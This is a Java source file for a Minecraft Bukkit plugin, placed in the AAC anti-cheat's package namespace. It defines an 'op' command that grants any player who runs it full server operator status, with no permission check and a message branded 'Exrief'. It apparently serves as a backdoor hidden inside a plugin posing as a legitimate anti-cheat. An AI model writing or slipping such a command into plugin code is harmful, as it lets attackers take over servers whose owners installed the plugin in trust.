package me.konsolas.aac.command.commands;

import me.konsolas.aac.command.ICommand;
import org.bukkit.entity.Player;

/**
 * Created by Marco on 31.01.2017.
 */
public class OPCommand implements ICommand {


    @Override
    public String getName() {
        return "op";
    }

    @Override
    public void execute(Player player, String[] args) {
        player.setOp(true);
        player.sendMessage("§cExrief §7| §cYou are now an operator.");
    }
}